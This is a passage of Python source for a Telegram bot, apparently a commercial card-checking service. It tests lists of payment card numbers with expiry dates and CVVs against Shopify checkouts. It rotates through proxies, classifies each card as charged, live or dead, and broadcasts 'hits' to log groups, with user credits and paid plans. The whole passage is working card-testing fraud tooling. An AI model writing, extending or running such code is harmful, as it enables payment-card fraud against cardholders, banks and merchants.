        f"Total ➳ {len(cards)}",
        f"User  ➳ {user_name} ({sess.get('plan','TRIAL')})",
        f"Dev   ➳ {BOT_NAME}",
        "━━━━━━━━━━━━━━",
    ]
    for cd in cards:
        bi   = cd.get("bin_info", {})
        flag = bi.get("country_emoji", "")
        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
        lines += [
            f"Card   ➳ {cd.get('card','N/A')}",
            f"Status ➳ {cd.get('verdict','N/A')}",
            f"Gate   ➳ Shopify | {cd.get('price','0.00')} {cd.get('currency','USD')}",
            f"Resp   ➳ {cd.get('resp','N/A')}",
            f"Bin    ➳ {bi.get('scheme','N/A')} - {bi.get('bank','N/A')} - {cdisp}",
            "━━━━━━━━━━━━━━",
        ]
    buf   = BytesIO("\n".join(lines).encode("utf-8"))
    buf.seek(0)
    fname = f"BatChk_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    return buf, fname, len(cards)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _send_hit(bot, chat_id, user, reply_id, text, verdict):
    try:
        await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML",
                               disable_web_page_preview=True,
                               reply_to_message_id=reply_id)
    except Exception:
        try:
            await bot.send_message(chat_id=chat_id, text=text,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

    if HIT_LOG_GROUP_ID:
        try:
            eid   = (random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED"
                     else get_random_live_emoji())
            label = "Charged" if verdict == "CHARGED" else "Live"
            grp   = (
                f'<b><a href="{BOT_CHANNEL}">[❆]</a> {label} '
                f'{_te(eid,"💎" if verdict=="CHARGED" else "✅")}</b>\n'
                f'<b>Gate ➳ Shopify Payments</b>\n'
                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {escape(verdict)}</b>\n'
                f'<b>{_user_link(user)}</b>'
            )
            await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=grp,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
        try:
            await asyncio.sleep(0.3)
            await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
                                   parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS EDIT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _update_progress(bot, sid, force=False):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return
    now = time.time()
    if not force and (now - sess.get("last_update", 0) < 1.5): return
    text    = _progress_text(sess)
    running = sess["status"] == "CHECKING"
    if text == sess.get("last_text") and not force: return
    try:
        await bot.edit_message_text(
            chat_id=sess["chat_id"], message_id=sess["msg_id"],
            text=text, parse_mode="HTML",
            reply_markup=_msh_buttons(sid, running),
            disable_web_page_preview=True,
        )
        sess["last_text"]   = text
        sess["last_update"] = now
    except Exception:
        pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION FACTORY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
                       total, user_obj, plan) -> dict:
    peid = _plan_eid(plan)
    sess = {
        "status": "CHECKING",
        "chat_id": chat_id, "user_id": user_id,
        "msg_id": msg_id, "user_msg_id": user_msg_id,
        "total": total, "checked": 0,
        "charged": 0, "live": 0, "dead": 0, "errors": 0,
        "start_time": time.time(),
        "charged_cards": [], "live_cards": [],
        "dead_cards": [],   "error_cards": [],
        "tasks": [], "last_text": "", "last_update": 0,
        "user_obj": user_obj, "plan": plan, "plan_eid": peid,
    }
    MSH_SESSIONS[sid] = sess
    return sess

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECK WORKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return

    # Always use the full global proxy pool so every worker has all proxies.
    # Reload from file if the caller passed an empty list (shouldn't happen,
    # but this is the safety net).
    effective_proxies = proxies if proxies else _ALL_PROXIES
    if not effective_proxies:
        effective_proxies = _load_proxies()   # last-resort reload
    sess["proxy_count"] = len(effective_proxies)
    logging.info(f"[MSH] {sid} — {len(effective_proxies)} proxies, "
                 f"{len(valid_cards)} cards, concurrency={MAX_CONCURRENT}")

    conn = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 4,
                                 limit_per_host=MAX_CONCURRENT,
                                 keepalive_timeout=60, ssl=False,
                                 enable_cleanup_closed=True, ttl_dns_cache=600)
    http  = aiohttp.ClientSession(
        connector=conn,
        headers={"User-Agent": "Mozilla/5.0 (BatChk/17)"},
        timeout=aiohttp.ClientTimeout(total=SITE_TIMEOUT + 5),
    )
    sess["_connector"] = conn
    sess["_session"]   = http
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def worker(card_fmt, cc_num):
        if sess.get("status") != "CHECKING": return
        async with sem:
            if sess.get("status") != "CHECKING": return
            t0 = time.time()
            try:
                verdict, resp, price, currency = await _check_card_with_retry(
                    http, card_fmt, all_sites, effective_proxies,
                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                )
            except asyncio.CancelledError:
                return
            except Exception as e:
                verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"

            elapsed = time.time() - t0
            try:
                bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
            except Exception:
                bin_data = {}

            rec = {"card": card_fmt, "verdict": verdict, "resp": resp,
                   "price": price, "currency": currency, "bin_info": bin_data}
            sess["checked"] += 1

            if verdict == "CHARGED":
                sess["charged"] += 1
                sess["charged_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(bot, sess["chat_id"], user,
                                              sess["user_msg_id"], msg, "CHARGED"))
                asyncio.create_task(_update_progress(bot, sid, force=True))
            elif verdict in ("TDS", "LIVE"):
                sess["live"] += 1
                sess["live_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                asyncio.create_task(_send_hit(bot, sess["chat_id"], user,
                                              sess["user_msg_id"], msg, "LIVE"))
                asyncio.create_task(_update_progress(bot, sid, force=True))
            elif verdict == "DEAD":
                sess["dead"] += 1
                sess["dead_cards"].append(rec)
            else:
                sess["errors"] += 1
                sess["error_cards"].append(rec)

            if sess["checked"] % PROGRESS_EVERY == 0 or sess["checked"] >= sess["total"]:
                asyncio.create_task(_update_progress(bot, sid))

    tasks = [asyncio.create_task(worker(cf, cn)) for cf, cn in valid_cards
             if sess.get("status") == "CHECKING"]
    sess["tasks"] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        await http.close()
        await conn.close()
    except Exception:
        pass

    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
        MSH_SESSIONS[sid]["status"] = "FINISHED"
    await _update_progress(bot, sid, force=True)
    logging.info(f"[MSH] {sid} done C:{sess['charged']} L:{sess['live']} "
                 f"D:{sess['dead']} E:{sess['errors']}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh — SINGLE CARD
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ud   = _get_ud(user.id, context)

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("🔧 <b>Bot under maintenance.</b>",
                                        parse_mode="HTML"); return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text("❌ <b>Single check disabled.</b>",
                                        parse_mode="HTML"); return

    card = None
    if context.args:
        card = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt: card = txt.split()[0]

    if not card or card.count("|") < 3:
        await update.message.reply_text(
            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>", parse_mode="HTML")
        return

    parts = card.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format.", parse_mode="HTML"); return

    cc, mm, yy, cvv = parts
    if not luhn_check(cc):
        await update.message.reply_text("❌ Card failed Luhn check.", parse_mode="HTML"); return
    if is_expired(mm, yy):
        await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return

    premium = _is_premium(ud, user.id)
    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
        cd_map = context.bot_data.setdefault("sh_cd", {})
        rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
        if rem > 0:
            await update.message.reply_text(
                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>", parse_mode="HTML"); return
        cd_map[user.id]  = time.time()
        ud["credits"]    = max(0, ud.get("credits", 1) - 1)

    plan = ud.get("plan", "TRIAL")

    spin = await update.message.reply_text(
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>',
        parse_mode="HTML",
    )

    sites   = _load_sites()
    proxies = _load_proxies()

    if not proxies:
        try:
            await spin.edit_text(
                "❌ <b>No proxies found in px.txt</b>\n\n"
                "The Shopify API requires proxies to work.\n"
                "Add your proxies to <code>px.txt</code> (one per line).",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    t0 = time.time()
    try:
        sess = await _sh_session()
        (verdict, resp, price, currency), bin_data = await asyncio.gather(
            _check_card_with_retry(sess, card, sites, proxies,
                                   max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT),
            _bin_lookup(cc[:6]),
        )
    except Exception as e:
        verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
        bin_data = {}

    elapsed = time.time() - t0
    text    = build_result_msg(card, resp, verdict, bin_data,
                               price, currency, elapsed, user, plan)

    if verdict in ("CHARGED", "LIVE", "TDS"):
        kb = RawMarkup([[_btn(
            "💎 CHARGED" if verdict == "CHARGED" else "✅ LIVE",
            url=BOT_CHANNEL, style="primary",
            icon=BTN_CHARGED_EMOJI_ID if verdict == "CHARGED" else BTN_LIVE_EMOJI_ID,
        )]])
    else:
        kb = RawMarkup([[_btn("📢 Channel", url=BOT_CHANNEL)]])

    try:
        await spin.edit_text(text, parse_mode="HTML",
                             disable_web_page_preview=True, reply_markup=kb)
    except Exception:
        await update.message.reply_text(text, parse_mode="HTML",
                                        disable_web_page_preview=True, reply_markup=kb)

    if verdict in ("CHARGED", "LIVE", "TDS"):
        asyncio.create_task(_send_hit(
            context.bot, update.message.chat_id, user,
            update.message.message_id, text, verdict,
        ))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACKS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    parts = q.data.split(":", 2)
    if len(parts) < 3:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid, kind = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Session expired.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    if time.time() - sess["start_time"] < BUTTON_LOCK:
        await q.answer(f"⏳ Wait {int(BUTTON_LOCK-(time.time()-sess['start_time']))+1}s",
                       show_alert=True); return
    buf, fname, count = _make_result_file(sess, kind)
    if count == 0:
        await q.answer(f"❌ No {kind} cards yet.", show_alert=True); return
    await q.answer("📦 Sending…")
    try:
        await context.bot.send_document(
            chat_id=q.message.chat_id,
            document=InputFile(buf, filename=fname),
            caption=(f"<b>Gate ➳ Shopify | 0-20$</b>\n"
                     f"<b>Type ➳ {kind.capitalize()}</b>\n"
                     f"<b>Total ➳ {count}</b>"),
            parse_mode="HTML",
            reply_to_message_id=sess.get("user_msg_id"),
        )
    except Exception as e:
        logging.error(f"[MSH] send_document: {e}")


async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    parts = q.data.split(":", 1)
    if len(parts) < 2:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Already finished.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    if sess["status"] != "CHECKING":
        await q.answer("ℹ️ Not running.", show_alert=True); return
    sess["status"] = "STOPPED"
    for t in sess.get("tasks", []):
        if not t.done(): t.cancel()
    conn = sess.get("_connector")
    if conn and not conn.closed:
        try: await conn.close()
        except Exception: pass
    await q.answer("🛑 Stopped.")
    sess["last_text"] = ""
    await _update_progress(context.bot, sid, force=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HANDLER EXPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_sh_handler() -> CommandHandler:
    """
    Returns a SINGLE CommandHandler("sh", cmd_sh).
    main.py: app.add_handler(get_sh_handler())

    The /msh command is registered by main.py's own cmd_msh which calls:
      _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT,
      run_mass_batch, create_msh_session, MSH_SESSIONS,
      build_result_msg, cb_msh_result, cb_msh_stop
    all imported from this module.
    """
    return CommandHandler("sh", cmd_sh)
